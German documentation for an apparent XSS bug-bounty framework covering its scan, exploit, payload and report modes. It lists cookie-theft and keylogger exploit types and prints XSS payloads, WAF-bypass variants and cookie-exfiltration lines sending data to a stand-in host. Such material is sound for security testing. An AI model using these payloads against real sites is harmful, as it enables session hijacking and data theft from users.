# XSS Hunter Pro Framework - Dokumentation

## Übersicht

Das XSS Hunter Pro Framework ist ein umfassendes Tool für professionelles XSS Bug Bounty Hunting. Es bietet eine vollständige Suite von Funktionen zur Erkennung, Ausnutzung, Analyse und Dokumentation von Cross-Site-Scripting-Schwachstellen.

## Inhaltsverzeichnis

1. [Installation](#installation)
2. [Grundlegende Verwendung](#grundlegende-verwendung)
3. [Modi und Funktionen](#modi-und-funktionen)
4. [Komponenten](#komponenten)
5. [Payload-Typen](#payload-typen)
6. [Berichterstellung](#berichterstellung)
7. [Integration mit externen Tools](#integration-mit-externen-tools)
8. [ML-basierte Payload-Optimierung](#ml-basierte-payload-optimierung)
9. [Erweiterte Funktionen](#erweiterte-funktionen)
10. [Fehlerbehebung](#fehlerbehebung)
11. [Häufig gestellte Fragen](#häufig-gestellte-fragen)
12. [Mitwirkende](#mitwirkende)
13. [Lizenz](#lizenz)

## Installation

### Voraussetzungen

- Python 3.8 oder höher
- pip (Python-Paketmanager)
- Internetverbindung für die Installation von Abhängigkeiten

### Installation über pip

```bash
pip install xsshunterpro
```

### Manuelle Installation

```bash
# Klonen des Repositories
git clone https://github.com/username/xsshunterpro.git

# Wechseln in das Verzeichnis
cd xsshunterpro

# Installation der Abhängigkeiten
pip install -r requirements.txt

# Installation des Frameworks
python setup.py install
```

### Installation über das Installationsskript

```bash
# Ausführen des Installationsskripts
python install.py
```

## Grundlegende Verwendung

### Hilfe anzeigen

```bash
python main.py --help
```

### Scanning nach Schwachstellen

```bash
python main.py --mode scan --url https://example.com -d 3
```

### Exploitation einer Schwachstelle

```bash
python main.py --mode exploit --url https://example.com/search --param q --exploit-type xss_data_theft
```

### Generierung optimierter Payloads

```bash
python main.py --mode payload --payload-context javascript --use-ml
```

### Erstellung eines Berichts

```bash
python main.py --mode report --report-file vulnerabilities.json --report-format html
```

## Modi und Funktionen

### Scan-Modus

Der Scan-Modus wird verwendet, um Websites auf XSS-Schwachstellen zu scannen. Er unterstützt verschiedene Optionen:

- `--url`: Die zu scannende URL
- `--depth`: Die Tiefe des Crawlings (Standard: 2)
- `--threads`: Die Anzahl der Threads (Standard: 5)
- `--timeout`: Der Timeout in Sekunden (Standard: 30)
- `--user-agent`: Der zu verwendende User-Agent
- `--cookies`: Die zu verwendenden Cookies
- `--headers`: Die zu verwendenden Header
- `--proxy`: Der zu verwendende Proxy
- `--exclude`: Auszuschließende URLs (Regex)
- `--include`: Einzuschließende URLs (Regex)
- `--output`: Die Ausgabedatei

Beispiel:

```bash
python main.py --mode scan --url https://example.com --depth 3 --threads 10 --timeout 60 --user-agent "Mozilla/5.0" --cookies "session=123" --headers "X-Custom: Value" --proxy "http://127.0.0.1:8080" --exclude "logout|admin" --include "search|product" --output scan_results.json
```

### Exploit-Modus

Der Exploit-Modus wird verwendet, um erkannte XSS-Schwachstellen auszunutzen. Er unterstützt verschiedene Optionen:

- `--url`: Die URL mit der Schwachstelle
- `--param`: Der anfällige Parameter
- `--exploit-type`: Der Typ des Exploits (data_theft, cookie_theft, keylogger, dom_manipulation)
- `--payload`: Der zu verwendende Payload (optional)
- `--callback-url`: Die Callback-URL für die Datenexfiltration
- `--custom-js`: Benutzerdefinierter JavaScript-Code
- `--output`: Die Ausgabedatei

Beispiel:

```bash
python main.py --mode exploit --url https://example.com/search --param q --exploit-type data_theft --callback-url https://attacker.com/collect --custom-js "alert(document.domain)" --output exploit_results.json
```

### Payload-Modus

Der Payload-Modus wird verwendet, um XSS-Payloads zu generieren. Er unterstützt verschiedene Optionen:

- `--payload-context`: Der Kontext des Payloads (html, javascript, url, dom, event_handlers)
- `--exploit-type`: Der Typ des Exploits (data_theft, cookie_theft, keylogger, dom_manipulation)
- `--use-ml`: Verwendung von ML zur Optimierung der Payloads
- `--num-payloads`: Die Anzahl der zu generierenden Payloads (Standard: 10)
- `--output`: Die Ausgabedatei

Beispiel:

```bash
python main.py --mode payload --payload-context javascript --exploit-type data_theft --use-ml --num-payloads 20 --output payloads.json
```

### Report-Modus

Der Report-Modus wird verwendet, um Berichte über erkannte Schwachstellen zu erstellen. Er unterstützt verschiedene Optionen:

- `--report-file`: Die Eingabedatei mit den Schwachstellen
- `--report-format`: Das Format des Berichts (html, json, txt)
- `--output`: Die Ausgabedatei
- `--template`: Die zu verwendende Berichtsvorlage
- `--include-screenshots`: Einbindung von Screenshots in den Bericht
- `--include-payloads`: Einbindung von Payloads in den Bericht
- `--include-requests`: Einbindung von Requests in den Bericht
- `--include-responses`: Einbindung von Responses in den Bericht

Beispiel:

```bash
python main.py --mode report --report-file vulnerabilities.json --report-format html --output report.html --template custom_template.html --include-screenshots --include-payloads --include-requests --include-responses
```

## Komponenten

Das XSS Hunter Pro Framework besteht aus verschiedenen Komponenten:

### Kern-Module

- `main.py`: Haupteinstiegspunkt mit Befehlszeilenparametern
- `adapter_layer.py` und `adapter_factory.py`: Adapter-Architektur für externe Tools
- `orchestration.py`: Orchestrierung der verschiedenen Komponenten
- `logger.py`: Logging-Funktionalität
- `error_handler.py`: Fehlerbehandlung
- `utils.py`: Hilfsfunktionen

### Integrations-Module

- `integrations/base.py`: Basis-Integration für alle Tools
- `integrations/webcrawler.py`: Web-Crawler-Integration
- `integrations/fuzzing.py`: Fuzzing-Integration
- `integrations/subdomain_discovery.py`: Subdomain-Discovery-Integration
- `integrations/vulnerability_scanner.py`: Vulnerability-Scanner-Integration
- `integrations/tool_adapters.py`: Adapter für externe Tools

### Funktionale Module

- `modules/payload_manager.py`: Verwaltung und Generierung von Payloads
- `modules/exploitation.py`: Exploitation-Engine
- `modules/report_generator.py`: Berichterstellung
- `modules/target_discovery.py`: Zielentdeckung
- `modules/vuln_categorization.py`: Schwachstellenkategorisierung
- `modules/callback_server.py`: Callback-Server für XSS-Angriffe

### Screenshot-Funktionalität

- `screenshot_manager.py`: Screenshot-Verwaltung
- `browser_screenshot.py`: Browser-Screenshot-Funktionalität

### ML-Komponenten

- `ml_payload_optimizer.py`: ML-basierte Payload-Optimierung

## Payload-Typen

Das XSS Hunter Pro Framework unterstützt verschiedene Payload-Typen:

### Basis-Payloads

Einfache XSS-Payloads für grundlegende Tests.

Beispiel:

```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Erweiterte Payloads

Fortgeschrittene XSS-Payloads für komplexere Angriffe.

Beispiel:

```javascript
<script>fetch('https://attacker.com/exfil?data='+btoa(document.cookie))</script>
<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://attacker.com/exfil',true);xhr.send(document.cookie)</script>
```

### DOM-basierte Payloads

Payloads für DOM-basierte XSS-Angriffe.

Beispiel:

```javascript
document.write('<script>alert(1)</script>')
document.body.innerHTML='<script>alert(1)</script>'
eval(location.hash.substr(1))
```

### WAF-Bypass-Payloads

Payloads zum Umgehen von Web Application Firewalls.

Beispiel:

```javascript
<script>setInterval`alert\x28document.domain\x29`</script>
<img src=x onerror=alert&#40;1&#41;>
<svg/onload=alert(1)>
```

## Berichterstellung

Das XSS Hunter Pro Framework unterstützt verschiedene Berichtsformate:

### HTML-Berichte

Interaktive HTML-Berichte mit Diagrammen und Filtern.

### JSON-Berichte

Maschinenlesbare JSON-Berichte für die Integration mit anderen Tools.

### TXT-Berichte

Einfache Textberichte für die schnelle Überprüfung.

### Berichtsvorlagen

Das Framework unterstützt benutzerdefinierte Berichtsvorlagen.

## Integration mit externen Tools

Das XSS Hunter Pro Framework kann mit verschiedenen externen Tools integriert werden:

### Web-Crawler

- Gospider
- Hakrawler
- Katana

### Fuzzing-Tools

- Wfuzz
- FFuF
- Burp Suite

### Subdomain-Discovery-Tools

- Subfinder
- Amass
- Sublist3r

### Vulnerability-Scanner

- Nuclei
- Nikto
- OWASP ZAP

## ML-basierte Payload-Optimierung

Das XSS Hunter Pro Framework verwendet maschinelles Lernen zur Optimierung von Payloads:

### Funktionsweise

1. Analyse des Kontexts
2. Auswahl geeigneter Payloads
3. Optimierung der Payloads basierend auf historischen Daten
4. Generierung neuer Payloads

### Vorteile

- Höhere Erfolgsraten
- Umgehung von Sicherheitsmaßnahmen
- Anpassung an verschiedene Kontexte

## Erweiterte Funktionen

### Callback-Server

Der Callback-Server ermöglicht die Exfiltration von Daten aus erfolgreichen XSS-Angriffen.

### Screenshot-Funktionalität

Die Screenshot-Funktionalität ermöglicht die Erstellung von Screenshots von erfolgreichen XSS-Angriffen.

### Kontextbasierte Payload-Generierung

Die kontextbasierte Payload-Generierung ermöglicht die Generierung von Payloads basierend auf dem Kontext.

### Automatische Erstellung von Proof-of-Concept-Exploits

Die automatische Erstellung von Proof-of-Concept-Exploits ermöglicht die schnelle Erstellung von Exploits für erkannte Schwachstellen.

## Fehlerbehebung

### Häufige Fehler

- **Fehler beim Starten des Frameworks**: Überprüfen Sie die Python-Version und die installierten Abhängigkeiten.
- **Fehler beim Scannen**: Überprüfen Sie die URL und die Netzwerkverbindung.
- **Fehler bei der Exploitation**: Überprüfen Sie den Parameter und den Payload.
- **Fehler bei der Berichterstellung**: Überprüfen Sie die Eingabedatei und das Ausgabeformat.

### Logging

Das Framework verwendet ein umfassendes Logging-System. Die Logs werden in der Datei `xsshunterpro.log` gespeichert.

## Häufig gestellte Fragen

### Allgemeine Fragen

- **Was ist XSS?**: Cross-Site Scripting (XSS) ist eine Sicherheitslücke, die es Angreifern ermöglicht, bösartigen Code in Webseiten einzuschleusen.
- **Welche Arten von XSS gibt es?**: Es gibt drei Hauptarten von XSS: Reflected XSS, Stored XSS und DOM-based XSS.
- **Wie kann ich XSS verhindern?**: XSS kann durch ordnungsgemäße Eingabevalidierung, Ausgabekodierung und Content Security Policy (CSP) verhindert werden.

### Framework-spezifische Fragen

- **Welche Python-Version wird benötigt?**: Python 3.8 oder höher.
- **Ist das Framework mit Windows kompatibel?**: Ja, das Framework ist mit Windows, Linux und macOS kompatibel.
- **Kann ich eigene Payloads hinzufügen?**: Ja, Sie können eigene Payloads in den Dateien im Verzeichnis `payloads` hinzufügen.
- **Kann ich eigene Integrationen hinzufügen?**: Ja, Sie können eigene Integrationen im Verzeichnis `integrations` hinzufügen.

## Mitwirkende

- Hauptentwickler: Anonymous
- Beitragende: Community

## Lizenz

Das XSS Hunter Pro Framework ist unter der MIT-Lizenz lizenziert.

```
MIT License

Copyright (c) 2025 Anonymous

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
